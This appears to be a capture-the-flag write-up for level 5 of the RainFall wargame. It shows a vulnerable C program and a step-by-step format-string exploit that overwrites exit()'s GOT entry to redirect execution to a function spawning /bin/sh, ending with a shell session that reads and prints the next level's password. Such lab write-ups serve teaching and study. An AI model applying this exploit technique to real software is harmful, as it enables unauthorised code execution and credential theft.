# Level 5

<h3>source.c</h3>

```console
void o(void) {
  system("/bin/sh");
  _exit(1);
}

void n(void) {
  char str[520];

  fgets(str, 521, stdin);
  printf(str);
  exit(1);
}

void main(void) {
  n();
}
```

<h3>Analysis</h3>

Another similar program, this time our target will be to call the `o()`

We could overwrite the `exit()` `GOT (Global Offsets Table)` to point to `o()` instead, so the program will execute `o()` instead of the real `exit()`

<h3>Exploit</h3>

The address of `o()` is at `0x080484a4`

The address of `exit()` is at `0x080483d0`

Next we need to find which arg position of the `printf()` that we can control on

```console
level5@RainFall:~$ (python -c "print 'aaaa' + ' [%x] ' * 5") | ./level5
aaaa [200]  [b7fd1ac0]  [b7ff37d0]  [61616161]  [78255b20]
```

There we have it, the 4th position!

Next we will need to get the `GOT` of `exit()`

```console
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
```

We have the address which is `0x08049838`

Now we need to write the address of `o()` into the `GOT` of `exit()`, so we need to get decimal version of the address, which is `134513828`

Since we already have the 4 bytes for the target address, the decimal value will be `134513824`

Same as the previous, we will use `%134513824d` to achieve it

```console
level5@RainFall:~$ (python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4\$n'"; cat - ) | ./level5
[...]
[...Ten eternity later...]
[...]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```